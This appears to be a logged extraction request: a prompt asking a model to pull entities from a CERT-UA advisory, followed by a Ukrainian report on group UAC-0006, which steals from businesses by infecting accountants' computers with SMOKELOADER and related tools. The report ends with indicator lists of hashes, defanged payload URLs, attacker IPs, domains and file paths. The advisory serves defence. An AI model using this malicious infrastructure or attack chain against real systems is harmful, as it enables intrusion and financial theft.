@@ -1,0 +1,549 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN RELATION TYPES ###
+- publishes: An organization or vendor officially releases or issues a security advisory, bulletin, or patch.
+- addresses-vulnerability-in: A security advisory or patch provides fixes for security vulnerabilities affecting a software product.
+- affects: A security vulnerability compromises or impacts a specific software product or component.
+- located-in: An organization, entity, or infrastructure is geographically or administratively based in a country or location.
+- part-of: An entity or component is a constituent sub-part of a larger system, suite, or organization.
+- hosts: An IP address, server, or domain hosts a specific file, malware payload, or service.
+- delivers: An exploit, campaign, or delivery mechanism drops or downloads a payload onto a target system.
+- exploits: A threat actor, malware, or campaign leverages a specific security vulnerability to compromise systems.
+- attacks: A threat actor compromises, targets, or executes unauthorized actions against a system, service, or organization.
+- communicates-with: A malware payload or host establishes network connections to an external IP address or server.
+- uses-malware: A threat actor utilizes or deploys a specific malware tool or family in their operations.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA вживаються точкові заходи, спрямовані на розкриття та мінімізацію вірогідності реалізації зловмисного задуму організованою групою зловмисників, що відстежується з 2013 року за ідентифікатором UAC-0006.</p><p>В контексті загального ландшафту кіберзагроз України угрупування UAC-0006 посідає перше місце в категорії фінансових злочинів, здійснюючи (спроби) викрадення грошових коштів з рахунків українських підприємств за допомогою шкідливих програм у розмірах від одного мільйону гривень на тиждень.</p><p>Нажаль, поточний стан кібербезпеки підприємств, установ і організацій, незважаючи на численні публікації та інформування щодо кіберзагроз, допускає надзвичайно низький рівень захищеності автоматизованих робочих місць бухгалтерів, на яких, фактично, здійснюється управління фінансами організацій на мільйони та мільярди гривень.</p><p>Незахищеність таких комп'ютерів може бути прямим свідченням недбалості керівників організацій та фахівців відповідних напрямів, що, в свою чергу та з вини останніх, неодмінно призводить до значних матеріальних збитків.</p><p>За наявною технічною інформацією отримання несанкціонованого доступу та подальше приховане управління інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема:</p><ul><li>SMOKELOADER</li><li>LOADERX3</li><li>RMS</li><li>RDPWRAPPER</li><li>DANABOT</li><li>LUMMASTEALER</li><li>REDLINESTEALER</li><li>SYSTEMBC</li><li>TALESHOT</li><li>PIEJET</li><li>LOADNEST</li><li>HANGTHREAD</li><li>BACKSTAB</li><li>AUKILL</li></ul><p><br></p><p>Загалом, після первинного ураження ЕОМ і доставки SMOKELOADER, останній використовується для завантаження і запуску на ЕОМ інших програм та модулів. Незважаючи на точковість розсилок (здебільшого, вони вже орієнтовані на бухгалтерів), виявлення "бухгалтерських" ЕОМ, зокрема, здійснюється за допомогою TALESHOT шляхом аналізу назв вікон та процесів програм, що функціонують на комп'ютері (список нижче), та регулярної відправки скріншотів зловмисникам для спостереження і прийняття рішення.</p><ul><li>iBank2 ua</li><li>iFOBS</li><li>CABiNET</li><li>Інтернет банкінг</li><li>Ощадбанк</li><li>БАНК</li><li>Piraeus</li><li>Інтернет-банкінг</li><li>Sense Bank</li><li>Онлайн Банкінг</li><li>iSign Desktop</li><li>A24&nbsp;</li><li>Банк Кредит Дніпро</li><li>Приват24 для бізнесу</li><li>bank</li><li>CorpLight</li><li>Sense</li><li>Укргазбанк</li><li>click</li><li>ifobsclient.exe</li><li>clibankonlineua.exe</li></ul><p><br></p><p>У випадку, якщо ЕОМ є цікавою для зловмисників (за назвою фінансової установи, розміром залишків на рахунках тощо) на ЕОМ довантажується збірка RMS + LOADERX3 + RDPWRAPPER, що надає можливість зловмиснику в інтерактивному прихованому режимі віддаленого робочому столу (паралельно з легітимним користувачем) проаналізувати детально потенційну жертву. Одночасна кількість таких "перспективних" комп'ютерів, за якими ведеться спостереження, складає декілька десятків ЕОМ.</p><p>Після прийняття рішення щодо можливості викрадення грошових коштів здійснюється підготовка ланцюга для виведення коштів (визначення підставних проміжних фірм, "дропів" тощо). В залежності від обставин оператор може або самостійно формувати несанкціонований платіж, або змінювати реквізити у вже підготовленому та відправленому на підпис директору документі.</p><p>Після відправки платіжки в банк з метою маскування/вигравання часу ЕОМ може бути виведено з ладу шляхом запуску спеціалізованих програм, зокрема, HANGTHREAD, що, фактично, здійснить DoS (відмову в обслуговування), тобто вичерпає обчислювальну потужність та призведе до постійного "зависання" комп'ютера.</p><p>Частина угрупування, відповідальна за отримання викрадених грошових коштів, може вдаватися до комунікації зі співробітниками банку, надаючи підроблену інформацію, в т.ч., документи, які, начебто, засвідчують легітимність платежів.</p><p><br></p><p>Так склалося, що робоче місце бухгалтера, за визначенням, передбачає обробку великої кількості вхідних електронних листів, в т.ч., отриманих в обхід можливого периметру захисту на електронні адреси сторонніх сервісів. Крім того, з такого комп'ютера здійснюється взаємодія з різномантіними інформаційними системами, що, в сукупності, потребує наявності доступу до мережі Інтернет.</p><p>Задля зменшення вірогідності реалізації кіберзагрози ЕОМ бухгалтерів потребують вжиття окремих технічних заходів, в першу чергу, обмеження можливості запуску виконуваних файлів та скриптів (бажано, за принципом "білого" списку) з використанням штатних технологій операційних систем Windows, таких як SRP або AppLocker. Прикро, але трапляються випадки коли на ЕОМ з мільйонними платіжками немає навіть засобу захисту від шкідливих програм ("антивірусу").</p><p><br></p><p>В статті надано технічну не вичерпну інформацію щодо актуальних індикаторів компрометації.</p><p><br></p><p>Просимо українські засоби масової інформації сприяти поширенню наведених у статті даних про актуальну кіберзагрозу.</p><p><br></p><p>Для зручності, посилання на пубікації щодо UAC-0006 наведено нижче:</p><ul><li><a href="https://cert.gov.ua/article/4555802" rel="noopener noreferrer" target="_blank">https://cert.gov.ua/article/4555802</a> (15.05.2023)</li><li><a href="https://cert.gov.ua/article/4755642" rel="noopener noreferrer" target="_blank">https://cert.gov.ua/article/4755642</a> (29.05.2023)</li><li><a href="https://cert.gov.ua/article/5158006" rel="noopener noreferrer" target="_blank">https://cert.gov.ua/article/5158006</a> (13.07.2023)</li><li><a href="https://cert.gov.ua/article/5269451" rel="noopener noreferrer" target="_blank">https://cert.gov.ua/article/5269451</a> (24.07.2023)</li><li><a href="https://cert.gov.ua/article/6032734" rel="noopener noreferrer" target="_blank">https://cert.gov.ua/article/6032734</a> (06.10.2023)</li></ul><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">cc4dc9f036d76fb1d9b9dd876a866a33	59126c9514edae03205274dddbd30687e8287c89a6a17828de3c8ec217edc823	-	Рахунки.tar
+01398c6e553132da83899bce8549823d	cc4e18d25ce53ae65c3d80fdcaa336f0439b61ed750621b4415a378a8881622e	-	Рахунки.document
+6e1dae122aee6095a3c0fb3b06b588ec	68f5eee3b2a9ece7df774de37fe6108d6417aa4d5f1b83fee96d69e3336bdf09	-	Рахунок_2084121_вiд_02_11_2023р.XLS.vbs
+e7eca51fe13df8f4270ce0c0cb2a5b7a	55f880682b9683a562739689d73863b50731d036b074660798ef4ef8779f3212	-	index.php
+1ec8db165fd00337acf3097ce1105055	859b9aa8b53f4ac30ffdc0bdb6865543f728eab41141f8ee356b97815bf05907	2022-06-10 23:18:26	mstsc.exe
+860927bbacf1b500b7e357edd8b5ab28	4c683c1262cbca4ef98dcd47e7bb7a3c0a0e013f48c9b9bad4dfdf9785aeda4a	2023-10-31 10:55:06	smoke.exe
+e6309a5562b1d6af94d9b92864b922f2	7fc53b389b0db7ea8de5293b0ab5647702ae4f53f8db62a9d4898fdfcbcfc8d8	2023-02-09 03:20:35	uaraewj
+f634458ac460762c0e9e3b8b7c29cb09	be33946e29b3f0d2f3b1b68042bd6e81f64a18da0f0705d104a85f1bee207432	-	Акт_Звiрки_та_рах.факт_вiд_12_07_2023.zip
+e56ad99f5e7fed2c2caa6a1c103bcb4e	87b6e328177b5564e2ff1ee689832b66401ec138290b9c6be9dfa5efe159ed89	-	накладная.zip
+d2534115c697e47fa88ddca72678281b	7d7262ab5298abd0e91b6831e37ef0156ded4fdceeaf8f8841c9a80d31f33f8e	-	Рахунок_до_оплати_389.zip
+89a48a234e13b3dd124dcca372ae6b94	cfc44f1399e3d28e55c32bcc73539358e5ac88c0d6a19188a52b161b506bea91	2020-12-01 18:01:01	Рахунок_до_оплати_389.exe
+553cc8aee992da42454595e76d7afb37	a8a3130c779904e23b50d69b4e73a714b345e296feebb9f64a732d5c73e7973b	2022-04-26 16:25:50	pax_389.exe
+e590ed2a0eac4f068beae4014c422e91	2100d850a75c59b8fd9397410bec6a3632db5166657514b68fcb6342dad20dc5	2023-09-11 11:58:47	pax_389.smoke.exe (SMOKELOADER)
+00ec71e2ae2c8c69dee05433a00ddece	3676ee70492d30e156eac1d1b8e7a99e18deb7beabd64dc89bbf18c6a9326579	-	Рахунок_фактура_вiд_18_08_2023р_Помилкове_зарахування.zip
+f670c45794880db143f04af876c1ea26	442b6485fe11df3c6c52f5fbee5285e0c3f3008f76a0e01a1f471384d0540fea	2020-12-01 18:00:55	1_Рахунок_фактура_вiд_18_08_2023р_Помилкове_зарахування.pdf.scr
+e48e084287f31f19fe4eaa542fe7994a	00a2495f4b60d76deb296e2e91bdad323d53d92287aead2c8138978aca4c7e7c	2022-04-05 16:14:47	Pax_18_08_23.jpg
+dd82ad2f0982d44af5adafa428af411b	466639f24592c750c89b2fd57e728142fb6573496bf8a03023516b7d5a2855fc	2023-08-22 10:42:56	Pax_18_08_23.jpg.smoke.exe (SMOKELOADER)
+efb98aaeb5bf5bcd27d1ee526e13a1f9	013596c0927c3e3e9863f9081766764f3edde0d6fec1d0c49d811342ae54a909	-	rss.rar
+3f4f5a6cb95047fea6102bd7d2226aa9	99fd9e75e6241eff30e01c5b59df9e901fb24d12bee89c069cc6158f78b3cc98	1970-01-01 00:00:00	winserv.exe (RMS)
+c719830edafcba1cfae6ac316802bead	8e692f03eaa57d78f7c1e6800da0607bda93c92d2aef48dc605d75ee380be4f7	2023-11-07 11:21:45	whosts.exe
+3ef1ade93df3fd610c750ae4b2eb5c53	b6051f4a4a60d5d1e43f66ca668bb62592bc97d85986e586a9d4fcaba359210d	2022-10-08 21:45:35	whosts.exe
+cdd1d99d6406c04377891ec42bfacf4d	eb05e77b24403f93f979a63c00d16654f3930fae33902bf5c9b0fdcd89317862	2023-10-27 07:03:22	grab.exe (TALESHOT)
+7cf7c96a6ea5b5620e7c52bcef571f5b	79da7ae818c5ce5521747b1295099ef2832d9f5defd41d84d45efe97feac1069	2023-09-24 07:45:38	71CB.tmp.exe (LOADERX3)
+62934e4932fd259480ebc745e98f27f6	ca941e6c5b488489213b60d4bc92f59bf41b2409c287f98c07cad23c89a16fd4	-	python2.py (PIEJET)
+f3b0c9f3837616d58f5b3b93a707e067	1709fc32454a86857fccad985e4a6c8f4c431912909d18262b58fc9119e9cc87	-	Re.ENC
+d6caa24a223da27b5409897a67558de7	fc1a3f4b69bf7a79fdee02d757a5a0f83af0a8fb9eb1d774e03c620a7e0bd484	2012-07-13 22:47:16	Re.exe
+5c14976a007e34cb8cbc71302e0218ed	bb8c2ada0a6504301326e0b6a64e0273499661f95f6acaac19a7aea47efff851	2019-04-10 13:11:58	Re.payload.dll
+d8f273fbfa22b9532d8446c48d58b4d5	3a5ac5f7bfaf605114ba2dfdd5f2aeb1f1b95bebed961db01f2ef4fee281d584	2089-10-26 23:18:59	_Re.payload.exe (REDLINESTEALER)
+d93a65d481ac91fe933c3983c0727e6d	d480591f35dc9654d8461b47067f5bf399e5fdf96e60b01ed6b7448665fe8a49	-	python.py (PIEJET)
+df19dcb46f1626274619d0a510367339	d2543728234362a648cb0b29affed8a0b9d3338fd0b1ca28eb921237221f1a61	-	RMS152.ENC
+4d3fed73e76b59331bc0b434c5e116ec	0b9f1f64ba966e524db3b76a196e0a4194749b072fa2c6095dfe515a0ec84e9c	2012-07-13 22:47:16	RMS152.exe
+a7a0b19a0687f4e96c82e33bf8b6a220	dea68b2fb5d4eeca75b472d432ee7c14eaa4cf6fbd211199302f6d9fcfc27e80	2019-04-10 13:11:58	RMS152.payload.dll
+74ada74560ef2abf4a5ebe6b61acf0d1	7e2fa02324aedc91e77578dc2e33168dade2f93d789c8d4818425b02552c6bbb	2103-10-19 11:06:01	_RMS152.payload.exe (REDLINESTEALER)
+c9d8239b0744ef3a51f748fecf720d11	6bee504317c9474ab2c90696d571e8ee08c3baa89cfbc528c2f2a6ce9d61ae3e	-	python194.py (PIEJET)
+ce956d5aa11b9fb152e7bad48c7a82fe	0de8b287ddc4c9674a7dfb915cc86960d5a9a14ff27e3aeed0fc79a611714ba0	-	Bot.ENC
+54d05b146bfef854f9f3cf7315e913c0	5879f41d795a34be029c0f7b4b7c4bdc8487ac98c3c2f733e7042cec9384d8a5	2023-11-18 23:57:12	Bot.exe (DANABOT)
+46b9857ccb9a821f867b30e874b0abc2	28f384fa60789be0449e713da57acdda36f48ad9eb027b819a5774efa1f330e0	-	CL.ENC
+8bbaea24b50233cafb1909379f488f46	d21a654530dee1fe7ec83288e820c7149462fdd31fe2a3100d12a526017000d3	2023-03-23 19:25:13	CL.exe (AUKILL)
+6f4cbef8adb1d38b55bafd5a2ed25900	7d2e3ffd2b53bf8fa821fca115cadb764831a98c1225d4969b46c25f9263d61c	-	lU.ENC
+fb90e043820ea943876190e58ace5a5e	2d018432e74a261f4731ab9c40f14a5596a58ad20483fb1d0c8523279071bd10	2023-10-28 21:59:09	lU.exe (LUMMASTEALER)
+e177aa61bd4e2190cb6d997a3e611988	4e9b3c53267496e9c4bdaff35ec73c3b928aa00df43bda0798fc44e4a00ebcd6	-	pro.ENC
+b179f612a3f84a1b8735bbbfbf027fdb	07145a445ffdc5212d900b1b08ed2b3fc9e01b23410d8c2b81b848a21b6cdd07	2023-10-27 21:54:00	pro.exe (BACKSTAB)
+8010dfb8f115f11dfbc3402e5d7d6376	72a0f478c5ec30435d9f6a0f88f4e05ff2a6129b75084c413d83cdeda95640e5	-	RED20.ENC
+0e2cb4abb14df801ab4fd9395ee1da2b	72f4983e496f2a3f98a308b4cd5514e873278a77f245f1af67429b68bdcfbc60	2012-07-13 22:47:16	RED20.exe
+c4ac477cf3976e5cd2b4e40a294631ad	a98b6eb53472ba4715831e5cd05ddf976fa31e4844372a729d03d773928b752b	2019-04-10 13:11:58	RED20.payload.dll
+73dd9658525a8902ff478d3781757f6f	4a18fd427e720bd443ab0c68da1a152a82580245fb517adf2170231316f124e2	2075-10-17 16:44:08	_RED20.payload.exe (REDLINESTEALER)
+c775f971e335894ba57f53ce25727f4c	38f548f2e6d8a1bb329353a7d6f0965d86039dc1dc7b0b9cb9ee518ec0ac0fb1	-	Bot2.ENC
+28049b64aae1c43772ad820fcc8c04e1	8e95e36a6a5adbfd819e456a2169af140a37dbc84a29323a0a82e78404729af4	2023-11-11 16:15:42	Bot2.exe (LUMMASTEALER)
+b7078c5c3705ac2c85627ff3125b31c6	f6f62f0561d54e5bbe6261f2e34ab7531e11986b0a0b95bb9c746fe7cf887f36	2020-08-01 02:44:50	$R15NBVX.exe (LOADNEST)
+e31aa82ddb9f8dd689e49002ef679d65	974fb18ae6501d22333c46c1eba9f4a0452bad5a2ee1db99468b601f4a5e99fb	2021-06-03 08:16:40	update_clean.exe
+807b28c93a4781a43f099d08cb83381a	540f5f2f4ae4c8f0c59f40539233b9d6280c2b4c5408e33590f34cd00c4db719	2021-06-03 07:54:26	update.exe
+de25b4e1376200d0b09e4b91cdfccbbc	e79ac607e174d2ffee97b3efd899484c3720e9dba796aa2cfb05217abd05bb19	2021-06-03 01:43:19	winsystem.exe (HANGTHREAD)
+98ccf02751ac36ba7532f10921a236d4	cdadc54e3525b7a5c6894640b4ee3990ae403c3c30c1bf4b6593194bcdb99d6e	-	0435.bat
+f5ef5abcee308e07245298e606148e7d	fc38d984f519fde3daade6c529fba6f876e12d986355533b703567b7f1e84eb1	-	TEST3.ENC
+fb611ea22af321e0492992fd04644320	2fb7946935b1974db9a9865e5ece3d8bcb676aa7da35e26228126c213881160d	2012-07-13 22:47:16	TEST3.exe (REDLINESTEALER)
+886b3a02db6e709d0db1c8efc6cc5888	b0df9e3ea2388c93a7f2f7f1339cab52ebfea40885cf9be43457ee1e14a758de	2023-11-07 11:21:45	svchosts.exe (TALESHOT)
+fb20ddb989d0873905cbe9b572a6fdab	fd56aeec91d539792301ee45517c5a2b97e1e22880dcd8c9fb7da60e11cce35d	2019-08-19 19:18:09	2cbe.exe (SYSTEMBC)
+e61f1ee63f169bf4b6d5b3ff4269adff	4bbddf37cf7ccf85920abfb4eb86bfb37b558616db11bad35ff92c151f907c1f	2023-07-09 08:28:54	cafa.tmp.exe
+3dc23dc2ce48172ec23946ebce15d955	f54440f8758df45a64f7fd69e51c6993c52bb019300dfa001a0f273e54861b4c	2023-08-06 09:05:52	cafa.tmp.decrypted.exe (LOADERX3)
+51d34adf7e8c3bbe9eae6af45e0b578c	47334e82c752d503aee8e14bbe5e2877bb4704c103037b2989e547bbd8a13399	2023-08-06 09:22:35	syslib.dll (LOADERX3)
+40174332b7a60e861bd16e91bf97a377	f8d486c2e9254d7e8e7a22e21f681e56a22c78b1457b44e5f5af68d833d30992	2023-08-05 08:10:52	windef.exe (injector)
+50801a6a1e77dd210692453068918719	7b00c678067209afc73e4e033c22f2a73bb00cb3b187f14f71fb9438f6b0d7d8	-	pdrs.rar
+1ba7180e94c0ed3b6fccf3a570e08c1c	d30a10cd63b5698fb9681f60193aa54da6ad104bfff7f5480082d219f9b36e3d	2022-07-23 20:09:53	pdrs.exe (RDPWRAPPER)
+c8be28017ead02d796491170c2b4779c	26e81deb48fc782b1c02da725212715b0f1f5497b7959e786d8e926140019c10	2023-07-29 15:50:09	svchost.exe (LOADERX3)
+73d5e14a9fb62e55719797fa27ff59fd	8c549f4c722051fe899ef4c187314ed7499cf2ef041ab731928f1b0d3207d1f1	2023-08-15 07:06:30	whosts.exe (TALESHOT)
+3e6437db9dd11c337b57be21b2d8af4f	c19b457db06b149c100dd8273757362f0dd2d972b82cda0c49eb849b748a9e35	2022-11-08 19:04:36	wmpsystem.exe (LOADERX3)
+391ca89a3ba44eb392ad6fe6d3e0b8b2	ce644469e151fb03ce0f7da650b4fd0f1e59df1fdea45c1fac01ef91079ff9c6	2023-03-20 16:11:13	pe64.exe
+c7359c9428e95d4fb2403d292fc36d86	2c0b94ce8d181d6e70c050572ce521314ff2810494be61332513b3293a0ff04a	2022-09-15 10:40:43	595a.tmp.exe
+4abeb55832395628d6d2a63b86fa98f3	b2ff4248a2c211be0a6bbb1c81ed2a75b4a2d43c6dbeb09fbbf415f2c24b0f56	2022-11-08 19:04:36	stub.exe (LOADERX3)
+59011d657d77964d8128a4e6e1be58bb	93aca6a2666afff5945a73505e6fb9ef8cfcc60a1013e30c2d042ab57e24c4d8	2022-09-15 10:40:43	7500.tmp.exe
+2c2162db95e4c54e054f6c4bf41bce40	0517f3d19ad13d3b9bd788de00bb575b123dcbd2f93feed19c5b8c71932cd378	2023-07-09 08:28:54	7500.tmp.unpacked.exe
+3dc23dc2ce48172ec23946ebce15d955	f54440f8758df45a64f7fd69e51c6993c52bb019300dfa001a0f273e54861b4c	2023-08-06 09:05:52	cafa.tmp.decrypted.exe (LOADERX3)
+8459291c94582a0cf7b20a75abe32e47	7bed586bda9b5cda15417049eace128f079c6484964574eaf0deb27da8f25514	-	stp.vbs
+b2880e839ecca8e7cce99aea2c4e0e7c	caec71789c7a1269b68b5087ca9fb8a4a465b8f2ff039600a73ead0690f45bc7	-	stp.bat
+dc159d07b8cdde55acebc57c1ca08e45	70f051b880fe4c1ba666269ebc42be586904c8147d42355dc33fd0ad82b0a03f	2022-11-08 19:04:36	wmpsystem.exe (LOADERX3)
+8f2fbecbd95bff475d1ed81c87a528e6	c863a947292209325b25dd6f3f336e40d305ebafe5af61539dab69eaf57d99a1	2023-03-20 10:02:06	dll64.exe
+ffcad40333d105366b2037ab97e22c44	b3557658e3e341f1e9017d317499f15cb9b4d61bbeb2839d2e173bfd7c7ca84f	-	ntwdblib64.cab
+333989fe97245c42878302e19f73908f	b6cc2602ec1538893e03dd5f3f1fc009ab8c711688bb03b5e3e396884d57e1a8	2021-10-27 04:53:34	ntwdblib.dll
+eff0347c302f49d6fde8c4f5885649c5	f680717659c07ce65766cacf5a108186e38565e91bb0e40e36b07780bb7eb1a3	2023-09-21 05:34:23	eff0347c302f49d6fde8c4f5885649c5.exe (LOADERX3)
+1dfb5800ddfd05a53d03f2748e2953ba	86ba96ad6889b0ced837513d8213f271eb8dee846eaca18eccb258b1e7c58a8e	2023-10-10 08:44:08	whosts.exe (TALESHOT)
+1a866aee8625c402b0a675b278b80ed4	a0682aed6e0c1b9d8bb734ec4641de1394e810c61bce687529c8d784148b8277	2022-02-23 23:42:22	wmpsystem.exe
+5ca9bc79f2a391bffffcbc1e46c21a75	edfb483c3a6ccc2cb3710175518e254d976c20a0cfa8054f110ebc15d97a2df9	-	ntwdblib.dll.cab
+9d1e55f38cec1cbc9f2395b93c1d45da	2b84023578c52f7086fd5a3dba6523ef5a011f894d802df4750cf126e9632036	2022-01-22 23:56:56	ntwdblib.dll
+287ab861aa011884231f8272dd376265	5dc12881583dafe77eb12c04172d15cd08086b89d818e69a12137a72412d61bc	-	ntwdblib.dll.cab
+520616ac3f2761c0ba28e9df46006c24	2971c3d824c0186ec56f7a70f13231081634675ceab6bf72bfe2c0d82a5d328a	2022-01-22 23:57:02	ntwdblib.dll
+2deed471aad264ac8ead41a136857cb3	26d9052fba22c204381e02ce14e391120823836e667407ad5107e892107db1c6	2022-03-03 13:15:57	2deed471aad264ac8ead41a136857cb3.exe
+59e79288620f722d314e6a322b98ebec	781cccb61e97abfaed8be526f27406c0d42317e2f3b4b29f9813483f858015e8	2022-05-14 14:17:26	newfile.exe (LOADERX3)
+002ee911a54f512dab8b833da0dc2a35	5401fe1d4765db70b0b629fc1834c6142eaee8d658b74b0c7d85a6a24130be4a	2023-07-29 15:49:58	svc86.exe
+0f26459bb921dc4e84111fa9bf47ae0e	3c3655ee88d3c2b223028ab4aeb69261836110792212bbb19ef67d141e7c4cd4	2010-07-22 10:30:57	setting.sys
+5475582d915220ac1b498037668ca47d	22db8b2b2edf976953e78f909a4d77a9bde817bf1109fdccff3f17bbf28573d0	2023-08-05 08:10:48	pe86.exe
+636653ebd2a209ea32412185e9d7b22c	4266cfdaac1693b20a681ee7eccd9faf1759b1da98e052be50e178fc59d4b527	-	ntwdblib86.cab
+ffad5f31e872f1021c1553da38fa78ac	a022ae3da8022d7ce2b655bcc404c71aa46dfe8a03b032c8fd32f345793f535a	2021-10-27 04:53:29	ntwdblib.dll
+7b148f783bc07078b341a45a2873ad02	2b7e1cbde28abd02186d95561325cd2458c48ec0850c08f181825f13126a57fc	2023-08-06 09:22:23	dll86.exe
+f33fde5733e125f568229b309175bf18	d5152e36935d23b789e74adb2db574752a3b7598eed825b7260d4fe400aa95d6	-	delete_loader.bat
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">(tcp)://104[.]194.130.185:443
+(tcp)://128[.]140.123.187:443
+(tcp)://213[.]227.154.170:443
+(tcp)://217[.]12.206.218:4001
+(tcp)://217[.]12.206.218:4444
+(tcp)://45[.]129.14.157:443
+(tcp)://78[.]24.222.162:37819
+104[.]194.130.185
+109[.]234.156.180
+128[.]140.123.187
+149[.]248.76.158
+152[.]89.198.77
+193[.]106.175.11
+195[.]85.115.195
+212[.]193.48.80
+213[.]227.154.170
+217[.]12.206.218
+45[.]129.14.157
+45[.]143.136.123
+45[.]144.28.76
+45[.]87.154.158
+78[.]24.222.162
+85[.]208.107.228
+91[.]203.193.162
+fXp://195[.]85.115.195:21/RMS194[.]ENC
+fXp://195[.]85.115.195:21/Re[.]ENC
+fXp://195[.]85.115.195:21/RMS152[.]ENC
+fXp://TEST4:159753@149[.]248.76.158/ASA[.]zip
+hXXp://152[.]89.198.77/Rar64[.]exe
+hXXp://152[.]89.198.77/rss[.]rar
+hXXp://217[.]12.206.218/dll64[.]exe
+hXXp://217[.]12.206.218/pdrs[.]rar
+hXXp://217[.]12.206.218/pe64[.]exe
+hXXp://217[.]12.206.218/rar64[.]exe
+hXXp://217[.]12.206.218/rss[.]rar
+hXXp://217[.]12.206.218/svc64[.]exe
+hXXp://45[.]144.28.76
+hXXp://45[.]144.28.76/pe64[.]exe
+hXXp://45[.]87.154.158
+hXXp://85[.]208.107.228/dll64[.]exe
+hXXp://85[.]208.107.228/ntwdblib64[.]cab
+hXXp://85[.]208.107.228/pe64[.]exe
+hXXp://againandagaingmorder[.]ru/index.php
+hXXp://coudzoom[.]ru/rmsuxjhfgsgf/rmns.exe
+hXXp://downloadrezerves[.]ru/download11/mstsc.exe
+hXXp://downloadrezerves[.]ru/index.php
+hXXp://unayt[.]ru/pdrs.rar
+hXXp://unayt[.]ru/rar.exe
+hXXp://unayt[.]ru/rar32.exe
+hXXp://unayt[.]ru/rss.rar
+africathrillthes[.]pw
+againandagaingmorder[.]ru
+bloockflad[.]pw
+bluepablo[.]fun
+boddyshow[.]fun
+bookgames[.]pw
+comperssw[.]fun
+coudzoom[.]ru
+dayzilons[.]pw
+downloadrezerves[.]ru
+duhodown[.]fun
+howlcars[.]fun
+keewoolas[.]pw
+killredls[.]pw
+kowersize[.]fun
+monopoliafromyou[.]ru
+moskhoods[.]pw
+mouseoiet[.]fun
+plengreg[.]fun
+revivalsecularas[.]pw
+rms-server.tektonit[.]ru
+steycools[.]pw
+superdadymster[.]ru
+unayt[.]ru
+zamesblack[.]fun
+cafeteriumups[.]ru
+</pre><p>Хостові:</p><pre class="ql-syntax" spellcheck="false">%APPDATA%\ASA.zip
+%APPDATA%\Microsoft\Chrome\SystemCertificates.exe
+%APPDATA%\Microsoft\Windows\ServiceDriver.exe
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update_clean.exe
+%APPDATA%\WRamPath\0435.bat
+%APPDATA%\WRamPath\winsystem.exe
+%APPDATA%\extra setup utilities 5.4\extra setup utilities 5.4\clekiqa.exe
+%APPDATA%\python.py
+%APPDATA%\python194.py
+%APPDATA%\python2.py
+%APPDATA%\pythonw.exe
+%APPDATA%\rshirca
+%APPDATA%\uaraewj
+%PROGRAMDATA%\App\Windows\Add\libeay32.dll
+%PROGRAMDATA%\App\Windows\Add\ssleay32.dll
+%PROGRAMDATA%\App\Windows\Add\whosts.exe
+%PROGRAMDATA%\This installation China Technologies\Shell Utilities 9.7\shell.exe
+%PROGRAMDATA%\WindowsTasksService\Rar.exe
+%PROGRAMDATA%\WindowsTasksService\pdrs.exe
+%PROGRAMDATA%\WindowsTasksService\pdrs.rar
+%PROGRAMDATA%\WindowsTasksService\rss.rar
+%PROGRAMDATA%\WindowsTasksService\settings.dat
+%PROGRAMDATA%\WindowsTasksService\winserv.exe
+%PROGRAMDATA%\Windows\App\Add\sys\whosts.exe
+%PROGRAMDATA%\Windows\App\Add\whosts.exe
+%PROGRAMDATA%\Windows\App\system\whosts.exe
